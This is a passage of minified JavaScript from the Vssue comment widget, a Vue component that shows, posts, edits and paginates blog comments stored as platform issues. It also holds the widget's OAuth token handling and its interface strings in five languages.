this.vssue.putComment({commentId:this.comment.id,content:this.editContent});e&&this.vssue.comments.data.splice(this.vssue.comments.data.findIndex(e=>e.id===this.comment.id),1,e)}this.editMode=!1}finally{this.isPutingComment=!1,this.vssue.isUpdatingComment=!1}}async deleteComment(){try{if(this.vssue.isPending)return;if(!window.confirm(this.vssue.$t("deleteConfirm")))return;this.isDeletingComment=!0,this.vssue.isUpdatingComment=!0;await this.vssue.deleteComment({commentId:this.comment.id})?(this.vssue.comments.count-=1,this.vssue.comments.data.length>1&&this.vssue.comments.data.splice(this.vssue.comments.data.findIndex(e=>e.id===this.comment.id),1),this.vssue.query.page>1&&this.vssue.query.page>Math.ceil(this.vssue.comments.count/this.vssue.query.perPage)?this.vssue.query.page-=1:await this.vssue.getComments()):this.vssue.$emit("error",new Error(this.vssue.$t("deleteFailed")))}finally{this.isDeletingComment=!1,this.vssue.isUpdatingComment=!1}}};Fr([Ln({type:Object,required:!0})],Jr.prototype,"comment",void 0),Fr([jn()],Jr.prototype,"vssue",void 0),Jr=Fr([Object(Tn.b)({components:{VssueIcon:zr}})],Jr);const Vr=Br({render:function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"vssue-comment",class:{"vssue-comment-edit-mode":e.editMode,"vssue-comment-disabled":e.isDeletingComment||e.isPutingComment}},[n("div",{staticClass:"vssue-comment-avatar"},[n("a",{attrs:{href:e.author.homepage,title:e.author.username,target:"_blank",rel:"noopener noreferrer"}},[n("img",{attrs:{src:e.author.avatar,alt:e.author.username}})])]),e._v(" "),n("div",{staticClass:"vssue-comment-body"},[e._t("body",[n("div",{staticClass:"vssue-comment-header"},[n("span",{staticClass:"vssue-comment-author"},[n("a",{attrs:{href:e.author.homepage,title:e.author.username,target:"_blank",rel:"noopener noreferrer"}},[e._v("\n            "+e._s(e.author.username)+"\n          ")])]),e._v(" "),n("span",{staticClass:"vssue-comment-created-at"},[e._v("\n          "+e._s(e.createdAt)+"\n        ")])]),e._v(" "),n("div",{staticClass:"vssue-comment-main"},[e.editMode?n("textarea",{directives:[{name:"model",rawName:"v-model",value:e.editContent,expression:"editContent"}],ref:"input",staticClass:"vssue-edit-comment-input",attrs:{rows:e.editInputRows},domProps:{value:e.editContent},on:{keyup:function(t){return!t.type.indexOf("key")&&e._k(t.keyCode,"enter",13,t.key,"Enter")?null:t.ctrlKey?e.putComment():null},input:function(t){t.target.composing||(e.editContent=t.target.value)}}}):n("article",{staticClass:"markdown-body",domProps:{innerHTML:e._s(e.content)}})]),e._v(" "),n("div",{staticClass:"vssue-comment-footer"},[e.editMode?n("span",{staticClass:"vssue-comment-hint"},[e._v("\n          "+e._s(e.vssue.$t("editMode"))+"\n        ")]):e._e(),e._v(" "),e.showReactions?n("span",{staticClass:"vssue-comment-reactions"},e._l(e.reactionKeys,(function(t){return n("span",{key:t,staticClass:"vssue-comment-reaction",attrs:{title:e.vssue.$t(e.creatingReactions.includes(t)?"loading":t)},on:{click:function(n){return e.postReaction({reaction:t})}}},[n("VssueIcon",{attrs:{name:e.creatingReactions.includes(t)?"loading":t,title:e.vssue.$t(e.creatingReactions.includes(t)?"loading":t)}}),e._v(" "),n("span",{staticClass:"vssue-comment-reaction-number"},[e._v("\n              "+e._s(e.comment.reactions[t])+"\n            ")])],1)})),0):e._e(),e._v(" "),n("span",{staticClass:"vssue-comment-operations"},[e.comment.author.username===e.currentUser&&e.editMode?n("span",{staticClass:"vssue-comment-operation",class:{"vssue-comment-operation-muted":e.isPutingComment},attrs:{title:e.vssue.$t(e.isPutingComment?"loading":"submit")},on:{click:function(t){return e.putComment()}}},[n("VssueIcon",{directives:[{name:"show",rawName:"v-show",value:e.isPutingComment,expression:"isPutingComment"}],attrs:{name:"loading",title:e.vssue.$t("loading")}}),e._v("\n\n            "+e._s(e.vssue.$t("submit"))+"\n          ")],1):e._e(),e._v(" "),e.comment.author.username===e.currentUser&&e.editMode?n("span",{staticClass:"vssue-comment-operation vssue-comment-operation-muted",attrs:{title:e.vssue.$t("cancel")},on:{click:function(t){return e.resetEdit()}}},[e._v("\n            "+e._s(e.vssue.$t("cancel"))+"\n          ")]):e._e(),e._v(" "),e.comment.author.username===e.currentUser?n("span",{directives:[{name:"show",rawName:"v-show",value:!e.editMode,expression:"!editMode"}],staticClass:"vssue-comment-operation",on:{click:function(t){return e.enterEdit()}}},[n("VssueIcon",{attrs:{name:"edit",title:e.vssue.$t("edit")}})],1):e._e(),e._v(" "),e.comment.author.username===e.currentUser||e.vssue.isAdmin?n("span",{directives:[{name:"show",rawName:"v-show",value:!e.editMode,expression:"!editMode"}],staticClass:"vssue-comment-operation",on:{click:function(t){return e.deleteComment()}}},[n("VssueIcon",{attrs:{name:e.isDeletingComment?"loading":"delete",title:e.vssue.$t(e.isDeletingComment?"loading":"delete")}})],1):e._e(),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:!e.editMode,expression:"!editMode"}],staticClass:"vssue-comment-operation",on:{click:function(t){return e.vssue.$emit("reply-comment",e.comment)}}},[n("VssueIcon",{attrs:{name:"reply",title:e.vssue.$t("reply")}})],1)])])])],2)])},staticRenderFns:[]},void 0,Jr,void 0,!1,void 0,!1,void 0,void 0,void 0);let Wr=class extends o.default{get disabled(){return this.vssue.isPending}get pageCount(){const e=Math.ceil(this.vssue.comments.count/this.vssue.comments.perPage);return e>1?e:1}get perPageOptions(){const e=[5,10,20,50];return!e.includes(this.vssue.options.perPage)&&this.vssue.options.perPage<100&&e.push(this.vssue.options.perPage),e.sort((e,t)=>e-t)}get page(){return this.vssue.query.page>this.pageCount?this.pageCount:this.vssue.query.page}set page(e){e>0&&e<=this.pageCount&&(this.vssue.query.page=e)}get perPage(){return this.vssue.query.perPage}set perPage(e){this.perPageOptions.includes(e)&&(this.vssue.query.perPage=e)}};Fr([jn()],Wr.prototype,"vssue",void 0),Wr=Fr([Object(Tn.b)({components:{VssueIcon:zr}})],Wr);const Kr=Br({render:function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"vssue-pagination"},[n("div",{staticClass:"vssue-pagination-per-page"},[n("label",[n("select",{directives:[{name:"model",rawName:"v-model",value:e.perPage,expression:"perPage"}],staticClass:"vssue-pagination-select",attrs:{disabled:e.disabled},on:{change:function(t){var n=Array.prototype.filter.call(t.target.options,(function(e){return e.selected})).map((function(e){return"_value"in e?e._value:e.value}));e.perPage=t.target.multiple?n:n[0]}}},e._l(e.perPageOptions,(function(t){return n("option",{key:t,domProps:{value:t}},[e._v("\n          "+e._s(t)+"\n        ")])})),0),e._v(" "),n("span",[e._v("\n        "+e._s(e.vssue.$t("perPage"))+"\n      ")])]),e._v(" "),e.vssue.API.platform.meta.sortable?n("span",{class:{"vssue-pagination-link":!0,disabled:e.disabled},attrs:{title:e.vssue.$t("sort")},on:{click:function(t){e.vssue.query.sort="asc"===e.vssue.query.sort?"desc":"asc"}}},[e._v("\n      "+e._s("asc"===e.vssue.query.sort?"↑":"↓")+"\n    ")]):e._e()]),e._v(" "),n("div",{staticClass:"vssue-pagination-page"},[n("span",{class:{"vssue-pagination-link":!0,disabled:1===e.page||e.disabled},attrs:{title:e.vssue.$t("prev")},domProps:{textContent:e._s("<")},on:{click:function(t){e.page-=1}}}),e._v(" "),n("label",[n("span",[e._v("\n        "+e._s(e.vssue.$t("page"))+"\n      ")]),e._v(" "),n("select",{directives:[{name:"show",rawName:"v-show",value:e.pageCount>1,expression:"pageCount > 1"},{name:"model",rawName:"v-model",value:e.page,expression:"page"}],staticClass:"vssue-pagination-select",attrs:{disabled:e.disabled},on:{change:function(t){var n=Array.prototype.filter.call(t.target.options,(function(e){return e.selected})).map((function(e){return"_value"in e?e._value:e.value}));e.page=t.target.multiple?n:n[0]}}},e._l(e.pageCount,(function(t){return n("option",{key:t,domProps:{value:t}},[e._v("\n          "+e._s(t)+"\n        ")])})),0),e._v(" "),n("span",{directives:[{name:"show",rawName:"v-show",value:e.pageCount<2,expression:"pageCount < 2"}],domProps:{textContent:e._s(e.page)}}),e._v(" "),n("span",{domProps:{textContent:e._s(" / "+e.pageCount+" ")}})]),e._v(" "),n("span",{class:{"vssue-pagination-link":!0,disabled:e.page===e.pageCount||e.disabled},attrs:{title:e.vssue.$t("next")},domProps:{textContent:e._s(">")},on:{click:function(t){e.page+=1}}})])])},staticRenderFns:[]},void 0,Wr,void 0,!1,void 0,!1,void 0,void 0,void 0);let Gr=class extends o.default{};Fr([jn()],Gr.prototype,"vssue",void 0),Gr=Fr([Object(Tn.b)({components:{TransitionFade:qr,VssueComment:Vr,VssuePagination:Kr}})],Gr);const Qr=Br({render:function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticClass:"vssue-comments"},[t("VssuePagination"),this._v(" "),t("TransitionFade",{attrs:{group:""}},this._l(this.vssue.comments.data,(function(e){return t("VssueComment",{key:e.id,attrs:{comment:e}})})),1),this._v(" "),t("VssuePagination",{directives:[{name:"show",rawName:"v-show",value:this.vssue.comments.data.length>5,expression:"vssue.comments.data.length > 5"}]})],1)},staticRenderFns:[]},void 0,Gr,void 0,!1,void 0,!1,void 0,void 0,void 0);const Zr=Br({},void 0,o.default.extend({name:"VssueIcon",functional:!0,props:{type:{type:String,required:!1,default:"default"}},render:(e,{props:t,data:n,children:r})=>e("button",Object.assign(Object.assign({},n),{class:["vssue-button","vssue-button-"+t.type]}),r)}),void 0,void 0,void 0,!1,void 0,void 0,void 0);let Yr=class extends o.default{constructor(){super(...arguments),this.content=""}get user(){return this.vssue.user}get platform(){return this.vssue.API&&this.vssue.API.platform.name}get isInputDisabled(){return this.loading||null===this.user||null===this.vssue.issue}get isSubmitDisabled(){return""===this.content||this.vssue.isPending||null===this.vssue.issue}get loading(){return this.vssue.isCreatingComment}get contentRows(){return this.content.split("\n").length-1}get inputRows(){return this.contentRows<3?5:this.contentRows+2}created(){this.vssue.$on("reply-comment",e=>{const t=e.contentRaw.replace(/\n/g,"\n> "),n=`@${e.author.username}\n\n> ${t}\n\n`;this.content=this.content.concat(n),this.focus()})}beforeDestroy(){this.vssue.$off("reply-comment")}focus(){this.$refs.input.focus()}async submit(){this.isSubmitDisabled||(await this.vssue.postComment({content:this.content}),this.content="",await this.vssue.getComments())}};Fr([jn()],Yr.prototype,"vssue",void 0),Yr=Fr([Object(Tn.b)({components:{VssueButton:Zr,VssueIcon:zr}})],Yr);const Xr=Br({render:function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"vssue-new-comment"},[n("div",{staticClass:"vssue-comment-avatar"},[e.user?n("a",{attrs:{href:e.user.homepage,title:e.user.username,target:"_blank",rel:"noopener noreferrer"}},[n("img",{attrs:{src:e.user.avatar,alt:e.user.username}})]):n("VssueIcon",{attrs:{name:e.platform.toLowerCase(),title:e.vssue.$t("loginToComment",{platform:e.platform})},on:{click:function(t){return e.vssue.login()}}})],1),e._v(" "),n("div",{staticClass:"vssue-new-comment-body"},[n("textarea",{directives:[{name:"model",rawName:"v-model",value:e.content,expression:"content"}],ref:"input",staticClass:"vssue-new-comment-input",attrs:{rows:e.inputRows,disabled:e.isInputDisabled,placeholder:e.vssue.$t(e.user?"placeholder":"noLoginPlaceHolder"),spellcheck:!1,"aria-label":"leave a comment"},domProps:{value:e.content},on:{keyup:function(t){return!t.type.indexOf("key")&&e._k(t.keyCode,"enter",13,t.key,"Enter")?null:t.ctrlKey?e.submit():null},input:function(t){t.target.composing||(e.content=t.target.value)}}})]),e._v(" "),n("div",{staticClass:"vssue-new-comment-footer"},[e.user?n("span",{staticClass:"vssue-current-user"},[n("span",[e._v(e._s(e.vssue.$t("currentUser"))+" - "+e._s(e.user.username)+" - ")]),e._v(" "),n("a",{staticClass:"vssue-logout",on:{click:function(t){return e.vssue.logout()}}},[e._v("\n        "+e._s(e.vssue.$t("logout"))+"\n      ")])]):n("span",{staticClass:"vssue-current-user"},[e._v("\n      "+e._s(e.vssue.$t("loginToComment",{platform:e.platform}))+"\n    ")]),e._v(" "),n("div",{staticClass:"vssue-new-comment-operations"},[e.user?n("VssueButton",{staticClass:"vssue-button-submit-comment",attrs:{type:"primary",disabled:e.isSubmitDisabled},on:{click:function(t){return e.submit()}}},[n("VssueIcon",{directives:[{name:"show",rawName:"v-show",value:e.loading,expression:"loading"}],attrs:{name:"loading"}}),e._v("\n\n        "+e._s(e.vssue.$t(e.loading?"submitting":"submitComment"))+"\n      ")],1):n("VssueButton",{staticClass:"vssue-button-login",attrs:{type:"primary",title:e.vssue.$t("loginToComment",{platform:e.platform})},on:{click:function(t){return e.vssue.login()}}},[e._v("\n        "+e._s(e.vssue.$t("login",{platform:e.platform}))+"\n      ")])],1)])])},staticRenderFns:[]},void 0,Yr,void 0,!1,void 0,!1,void 0,void 0,void 0);let ea=class extends o.default{constructor(){super(...arguments),this.progress={show:!1,percent:0,timer:null,speed:200},this.alert={show:!1,message:null,timer:null}}onLoadingCommentsChange(e){this.vssue.comments&&(e?this.progressStart():this.progressDone())}created(){this.vssue.$on("error",e=>this.alertShow(e.message))}beforeDestroy(){this.vssue.$off("error"),null!==this.progress.timer&&window.clearTimeout(this.progress.timer),null!==this.alert.timer&&window.clearTimeout(this.alert.timer)}progressStart(){this.progress.show=!0,this.progress.percent=0,this.progress.timer=window.setInterval(()=>{this.progress.percent+=5,this.progress.percent>94&&null!==this.progress.timer&&window.clearInterval(this.progress.timer)},this.progress.speed)}progressDone(){this.progress.percent=100,null!==this.progress.timer&&window.clearTimeout(this.progress.timer),this.progress.timer=null,window.setTimeout(()=>{this.progress.show=!1},this.progress.speed)}alertShow(e){this.alert.show=!0,this.alert.message=e,null!==this.alert.timer&&window.clearTimeout(this.alert.timer),this.alert.timer=window.setTimeout(()=>{this.alertHide()},3e3)}alertHide(){this.alert.show=!1,null!==this.alert.timer&&window.clearTimeout(this.alert.timer),this.alert.timer=null}};Fr([jn()],ea.prototype,"vssue",void 0),Fr([Mn("vssue.isLoadingComments")],ea.prototype,"onLoadingCommentsChange",null),ea=Fr([Object(Tn.b)({components:{TransitionFade:qr}})],ea);const ta=Br({render:function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"vssue-notice"},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.progress.show,expression:"progress.show"}],staticClass:"vssue-progress",style:{width:e.progress.percent+"%",transition:"all "+e.progress.speed+"ms linear"}}),e._v(" "),n("TransitionFade",[n("div",{directives:[{name:"show",rawName:"v-show",value:e.alert.show,expression:"alert.show"}],staticClass:"vssue-alert",domProps:{textContent:e._s(e.alert.message)},on:{click:function(t){return e.alertHide()}}})])],1)},staticRenderFns:[]},void 0,ea,void 0,!1,void 0,!1,void 0,void 0,void 0);let na=class extends o.default{get status(){return this.vssue.isFailed?"failed":this.vssue.isInitializing?"initializing":this.vssue.isIssueNotCreated&&!this.vssue.isCreatingIssue?this.vssue.isAdmin||!this.vssue.isLogined?"issueNotCreated":"failed":this.vssue.isLoginRequired?"loginRequired":!this.vssue.comments||this.vssue.isCreatingIssue?"loadingComments":0===this.vssue.comments.data.length?"noComments":null}handleClick(){"issueNotCreated"===this.status?this.vssue.postIssue():"loginRequired"===this.status&&this.vssue.login()}};Fr([jn()],na.prototype,"vssue",void 0),na=Fr([Object(Tn.b)({components:{TransitionFade:qr,VssueIcon:zr}})],na);const ra=Br({render:function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("TransitionFade",[e.status?n("div",{key:e.status,staticClass:"vssue-status"},[["failed","loadingComments","initializing"].includes(e.status)?n("VssueIcon",{attrs:{name:"failed"===e.status?"error":"loading"}}):e._e(),e._v(" "),n("p",{staticClass:"vssue-status-info"},[n(["issueNotCreated","loginRequired"].includes(e.status)?"a":"span",{tag:"Component",on:{click:e.handleClick}},[e._v("\n        "+e._s(e.vssue.$t(e.status))+"\n      ")])],1)],1):e._e()])},staticRenderFns:[]},void 0,na,void 0,!1,void 0,!1,void 0,void 0,void 0);let aa=class extends o.default{};Fr([jn()],aa.prototype,"vssue",void 0),aa=Fr([Object(Tn.b)({components:{TransitionFade:qr,VssueIcon:zr,VssueComments:Qr,VssueNewComment:Xr,VssueNotice:ta,VssueStatus:ra}})],aa);const oa=Br({render:function(){var e=this.$createElement,t=this._self._c||e;return t("TransitionFade",[this.vssue.isInitializing?t("VssueStatus"):t("div",{staticClass:"vssue-body"},[this.vssue.API?t("VssueNewComment"):this._e(),this._v(" "),t("VssueNotice"),this._v(" "),t("TransitionFade",[this.vssue.comments&&this.vssue.comments.data.length>0?t("VssueComments"):t("VssueStatus")],1)],1)],1)},staticRenderFns:[]},void 0,aa,void 0,!1,void 0,!1,void 0,void 0,void 0);let ia=class extends o.default{};Fr([jn()],ia.prototype,"vssue",void 0),ia=Fr([Tn.b],ia);const sa=Br({render:function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"vssue-header"},[n("a",{staticClass:"vssue-header-comments-count",attrs:{href:e.vssue.issue?e.vssue.issue.link:null,target:"_blank",rel:"noopener noreferrer"}},[n("span",[e._v("\n      "+e._s(e.vssue.comments?e.vssue.$tc("comments",e.vssue.comments.count,{count:e.vssue.comments.count}):e.vssue.$tc("comments",0))+"\n    ")])]),e._v(" "),n("span",{staticClass:"vssue-header-powered-by"},[n("span",[e._v("Powered by")]),e._v(" "),e.vssue.API?n("span",[n("a",{attrs:{href:e.vssue.API.platform.link,title:e.vssue.API.platform.name+" API "+e.vssue.API.platform.version,target:"_blank",rel:"noopener noreferrer"}},[e._v("\n        "+e._s(e.vssue.API.platform.name)+"\n      ")]),e._v(" "),n("span",[e._v("&")])]):e._e(),e._v(" "),n("a",{attrs:{href:"https://github.com/meteorlxy/vssue",title:"Vssue v"+e.vssue.version,target:"_blank",rel:"noopener noreferrer"}},[e._v("\n      Vssue\n    ")])])])},staticRenderFns:[]},void 0,ia,void 0,!1,void 0,!1,void 0,void 0,void 0),la={login:"Login with {platform}",logout:"Logout",currentUser:"Current User",loading:"Loading",submit:"Submit",submitting:"Submitting",submitComment:"Submit Comment",cancel:"Cancel",edit:"Edit",editMode:"Edit Mode",delete:"Delete",reply:"Reply",heart:"Heart",like:"Like",unlike:"Unlike",perPage:"Comments per page",sort:"Click to change the sort direction",page:"Page",prev:"Previous Page",next:"Next Page",comments:"Comments | {count} Comment | {count} Comments",loginToComment:"Login with {platform} account to leave a comment",placeholder:"Leave a comment. Styling with Markdown is supported. Ctrl + Enter to submit.",noLoginPlaceHolder:"Login to leave a comment. Styling with Markdown is supported. ",failed:"Failed to load comments",initializing:"Initializing...",issueNotCreated:"Click to create issue",loadingComments:"Loading comments...",loginRequired:"Login to view comments",noComments:"No comments yet. Leave the first comment !",reactionGiven:"Already given '{reaction}' reaction",deleteConfirm:"Confirm to delete this comment ?",deleteFailed:"Failed to delete comment"},ca={login:"使用 {platform} 登录",logout:"退出登录",currentUser:"当前用户",loading:"加载中",submit:"提交",submitting:"发表中",submitComment:"发表评论",cancel:"取消",edit:"编辑",editMode:"编辑模式",delete:"删除",reply:"回复",heart:"喜欢",like:"赞",unlike:"踩",perPage:"每页评论数",sort:"点击改变排序方式",page:"页数",prev:"上一页",next:"下一页",comments:"评论 | {count} 条评论 | {count} 条评论",loginToComment:"使用 {platform} 帐号登录后发表评论",placeholder:"留下你的评论丨支持 Markdown 语法丨Ctrl + Enter 发表评论",noLoginPlaceHolder:"登录后才能发表评论丨支持 Markdown 语法",failed:"评论加载失败",initializing:"正在初始化...",issueNotCreated:"点击创建 Issue",loadingComments:"正在加载评论...",loginRequired:"登录后查看评论",noComments:"还没有评论，来发表第一条评论吧！",reactionGiven:"已经添加过 '{reaction}' 了",deleteConfirm:"确认要删除该评论吗？",deleteFailed:"评论删除失败"},ua={login:"Entrar com {platform}",logout:"Sair",currentUser:"Usuário Atual",loading:"Carregando",submit:"Enviar",submitting:"Enviando",submitComment:"Enviar Comentário",cancel:"Cancelar",edit:"Editar",editMode:"Modo de Edição",delete:"Apagar",reply:"Responder",heart:"Heart",like:"Like",unlike:"Unlike",perPage:"Comentários por página",sort:"Clique para alterar a ordenação",page:"Página",prev:"Página Anterior",next:"Próxima Página",comments:"Comentários | {count} Comentário | {count} Comentários",loginToComment:"Entre com uma conta {platform} para deixar um comentário",placeholder:"Deixe um comentário. Estilos com Markdown suportados. Ctrl + Enter para enviar.",noLoginPlaceHolder:"Entre para deixar um comentário. Estilos com Markdown suportados. ",failed:"Falha ao carregar comentários",initializing:"Inicializando...",issueNotCreated:"Click to create issue",loadingComments:"Carregando comentários...",loginRequired:"Entrar para visualizar comentários",noComments:"Nenhum comentário. Deixe o primeiro comentário!",reactionGiven:"Já reagiu com '{reaction}'",deleteConfirm:"Apagar este comentário?",deleteFailed:"Falha ao apagar comentário"},pa={login:"{platform} でログイン",logout:"ログアウト",currentUser:"現在のユーザー",loading:"読み込み中",submit:"送信",submitting:"送信中",submitComment:"コメントを送信",cancel:"キャンセル",edit:"編集",editMode:"編集モード",delete:"削除",reply:"返信",heart:"ハート",like:"高評価",unlike:"低評価",perPage:"コメント/ページ",sort:"並び順を変更するにはクリックしてください",page:"ページ",prev:"前のページ",next:"次のページ",comments:"コメント | {count} コメント | {count} コメント",loginToComment:"コメントを残すには {platform} アカウントでログインしてください。",placeholder:"コメントを残してください。Markdown 記法をサポートしています。 Ctrl + Enter で送信できます。",noLoginPlaceHolder:"コメントを残すにはログインしてください。マークダウン記法をサポートしています。",failed:"コメントの読み込みに失敗しました",initializing:"初期化中...",issueNotCreated:"Click to create issue",loadingComments:"コメントの読み込み中...",loginRequired:"コメントを見るにはログインしてください",noComments:"まだコメントがありません。最初のコメントを残しましょう！",reactionGiven:"既に '{reaction}' のリアクションをしています",deleteConfirm:"本当にコメントを削除してもいいですか？",deleteFailed:"コメントの削除に失敗しました"},da={login:"התחברו עם {platform}",logout:"התנתקו",currentUser:"משתמש/ת נוכחי/ת",loading:"טוען",submit:"שליחה",submitting:"שולח",submitComment:"שליחת תגובה",cancel:"ביטל",edit:"עריכה",editMode:"מצב עריכה",delete:"מחיקה",reply:"תשובה",heart:"לב",like:"לייק",unlike:"אנלייק",perPage:"תגובות לדף",sort:"לחצו כדי לשנות את כיוון המיון",page:"דף",prev:"הדף הקודם",next:"הדף הבא",comments:"תגובות | {count} תגובה | {count} תגובות",loginToComment:"התחברו עם חשבון {platform} כדי להשאיר תגובה",placeholder:"השאירו תגובה. יש תמיכה בעיצוב בעזרת Markdown. Ctrl + Enter כדי לשלוח.",noLoginPlaceHolder:"התחברו כדי להשאיר תגובה. יש תמיכה בעיצוב בעזרת Markdown. ",failed:"כשלון בטעינת התגובות",initializing:"מאתחל...",issueNotCreated:"לחצו ליצירת issue",loadingComments:"טוען תגובות...",loginRequired:"התחברו כדי לצפות בתגובות",noComments:"עדיין אין תגובות. השאירו תגובה ראשונה !",reactionGiven:"כבר ניתן חיווי '{reaction}'",deleteConfirm:"בטוחים במחיקת התגובה ?",deleteFailed:"כשלון במחיקת התגובה"};Object.prototype.hasOwnProperty.call(o.default,"$i18n")||o.default.use($r);const ga=new $r({locale:"en",fallbackLocale:"en",messages:{en:la,"en-US":la,zh:ca,"zh-CN":ca,pt:ua,"pt-BR":ua,ja:pa,"ja-JP":pa,he:da,"he-IL":da}});let ha=class extends o.default{constructor(){super(...arguments),this.title=e=>`${e.prefix}${document.title}`,this.issueId=null,this.options=null,this.API=null,this.accessToken=null,this.user=null,this.issue=null,this.comments=null,this.query={page:1,perPage:10,sort:"desc"},this.isInitializing=!0,this.isIssueNotCreated=!1,this.isLoginRequired=!1,this.isFailed=!1,this.isCreatingIssue=!1,this.isLoadingComments=!1,this.isCreatingComment=!1,this.isUpdatingComment=!1}get version(){return"1.4.7"}get issueTitle(){return null===this.options?"":"function"==typeof this.title?this.title(this.options):`${this.options.prefix}${this.title}`}get isPending(){return this.isLoadingComments||this.isCreatingComment||this.isUpdatingComment}get isLogined(){return null!==this.accessToken&&null!==this.user}get isAdmin(){return null!==this.options&&null!==this.accessToken&&null!==this.user&&(this.user.username===this.options.owner||this.options.admins.includes(this.user.username))}get accessTokenKey(){return this.API?`Vssue.${this.API.platform.name.toLowerCase()}.access_token`:""}onQueryPerPageChange(){this.query.page=1,this.getComments()}onQueryChange(){this.getComments()}setOptions(e){this.options=Object.assign({labels:["Vssue"],state:"Vssue",prefix:"[Vssue]",admins:[],perPage:10,proxy:e=>"https://cors-anywhere.herokuapp.com/"+e,issueContent:({url:e})=>e,autoCreateIssue:!1},e);const t=["api","owner","repo","clientId"];for(const e of t)this.options[e]||console.warn(`[Vssue] the option '${e}' is required`);if(this.options.locale)this.$i18n.locale=this.options.locale;else{const e=Object.keys(this.$i18n.messages),t=window.navigator.languages;this.$i18n.locale=t.filter(t=>e.includes(t)).shift()||"en"}}async init(){try{await this.initStore(),await this.initComments()}catch(e){e.response&&[401,403].includes(e.response.status)?this.isLoginRequired=!0:this.isFailed=!0,console.error(e)}}async initStore(){try{if(!this.options)throw new Error("Options are required to initialize Vssue");this.API=null,this.accessToken=null,this.user=null,this.issue=null,this.comments=null,this.query={page:1,perPage:this.options.perPage,sort:"desc"},this.isInitializing=!0,this.isIssueNotCreated=!1,this.isLoginRequired=!1,this.isFailed=!1,this.isCreatingIssue=!1,this.isLoadingComments=!1,this.isCreatingComment=!1,this.isUpdatingComment=!1;const e=this.options.api;this.API=new e({baseURL:this.options.baseURL,labels:this.options.labels,state:this.options.state,owner:this.options.owner,repo:this.options.repo,clientId:this.options.clientId,clientSecret:this.options.clientSecret,proxy:this.options.proxy}),await this.handleAuth()}finally{this.isInitializing=!1}}async initComments(){if(this.API&&this.options)if(this.issueId){const[e,t]=await Promise.all([this.API.getIssue({accessToken:this.accessToken,issueId:this.issueId}),this.API.getComments({accessToken:this.accessToken,issueId:this.issueId,query:this.query})]);this.issue=e,this.comments=t}else this.issue=await this.API.getIssue({accessToken:this.accessToken,issueTitle:this.issueTitle}),null===this.issue?(this.isIssueNotCreated=!0,this.options.autoCreateIssue&&await this.postIssue()):await this.getComments()}async postIssue(){if(this.API&&this.options&&!this.issue&&!this.issueId&&(this.isLogined||this.login(),this.isAdmin))try{this.isCreatingIssue=!0;const e=await this.API.postIssue({title:this.issueTitle,content:await this.options.issueContent({options:this.options,url:Hn(window.location.href)}),accessToken:this.accessToken});this.issue=e,this.isIssueNotCreated=!1,await this.getComments()}catch(e){this.isFailed=!0}finally{this.isCreatingIssue=!1}}async getComments(){try{if(!this.API||!this.issue||this.isLoadingComments)return;this.isLoadingComments=!0;const e=await this.API.getComments({accessToken:this.accessToken,issueId:this.issue.id,query:this.query});return this.comments=e,this.query.page!==e.page&&(this.query.page=e.page),this.query.perPage!==e.perPage&&(this.query.perPage=e.perPage),e}catch(e){if(!e.response||![401,403].includes(e.response.status)||this.isLogined)throw this.$emit("error",e),e;this.isLoginRequired=!0}finally{this.isLoadingComments=!1}}async postComment({content:e}){try{if(!this.API||!this.issue||this.isCreatingComment)return;this.isCreatingComment=!0;return await this.API.postComment({accessToken:this.accessToken,content:e,issueId:this.issue.id})}catch(e){throw this.$emit("error",e),e}finally{this.isCreatingComment=!1}}async putComment({commentId:e,content:t}){try{if(!this.API||!this.issue)return;return await this.API.putComment({accessToken:this.accessToken,issueId:this.issue.id,commentId:e,content:t})}catch(e){throw this.$emit("error",e),e}}async deleteComment({commentId:e}){try{if(!this.API||!this.issue)return;return await this.API.deleteComment({accessToken:this.accessToken,issueId:this.issue.id,commentId:e})}catch(e){throw this.$emit("error",e),e}}async getCommentReactions({commentId:e}){try{if(!this.API||!this.issue)return;return await this.API.getCommentReactions({accessToken:this.accessToken,issueId:this.issue.id,commentId:e})}catch(e){throw this.$emit("error",e),e}}async postCommentReaction({commentId:e,reaction:t}){try{if(!this.API||!this.issue)return!1;return await this.API.postCommentReaction({accessToken:this.accessToken,issueId:this.issue.id,commentId:e,reaction:t})}catch(e){throw this.$emit("error",e),e}}login(){this.API&&this.API.redirectAuth()}logout(){this.setAccessToken(null),this.user=null}async handleAuth(){if(!this.API)return;const e=await this.API.handleAuth();e?(this.setAccessToken(e),this.user=await this.API.getUser({accessToken:e})):this.getAccessToken()?this.user=await this.API.getUser({accessToken:this.accessToken}):(this.setAccessToken(null),this.user=null)}getAccessToken(){return this.accessToken=window.localStorage.getItem(this.accessTokenKey),this.accessToken}setAccessToken(e){null===e?window.localStorage.removeItem(this.accessTokenKey):window.localStorage.setItem(this.accessTokenKey,e),this.accessToken=e}};Fr([Mn("query.perPage")],ha.prototype,"onQueryPerPageChange",null),Fr([Mn("query.page"),Mn("query.sort")],ha.prototype,"onQueryChange",null),ha=Fr([Object(Tn.b)({i18n:ga})],ha);var fa=ha;let ma=class extends o.default{constructor(){super(...arguments),this.vssue=new fa}onOptionsChange(e){this.vssue.setOptions(e)}mounted(){null!==this.title&&(this.vssue.title=this.title),null!==this.issueId&&(this.vssue.issueId=this.issueId),this.vssue.setOptions(this.options),this.vssue.init()}};var va;Fr([Ln({type:[String,Function],required:!1,default:null})],ma.prototype,"title",void 0),Fr([Ln({type:[String,Number],required:!1,default:null})],ma.prototype,"issueId",void 0),Fr([Ln({type:Object,required:!1,default:()=>({})})],ma.prototype,"options",void 0),Fr([(va="vssue",Object(Tn.a)((function(e,t){var n=e.provide;An(e),Pn(n)&&(n=e.provide=Cn(n)),n.managed[t]=va||t})))],ma.prototype,"vssue",void 0),Fr([Mn("options",{deep:!0})],ma.prototype,"onOptionsChange",null),ma=Fr([Object(Tn.b)({components:{Iconfont:Hr,VssueBody:oa,VssueHeader:sa}})],ma);const ba=Br({render:function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticClass:"vssue"},[t("Iconfont"),this._v(" "),t("VssueHeader"),this._v(" 